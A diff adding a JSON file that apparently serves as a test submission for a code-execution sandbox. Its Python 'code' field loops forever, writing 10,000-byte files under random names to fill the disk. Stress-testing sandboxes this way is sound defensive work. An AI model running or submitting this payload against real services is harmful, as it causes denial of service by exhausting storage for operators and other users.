@@ -1,0 +1,4 @@
+{
+  "compiler": "cpython",
+  "code": "import random\nwhile True:\n    with open(str(random.randint(100000000, 999999999)), \"w+\") as f:\n        f.write(\"A\"*10000)"
+}
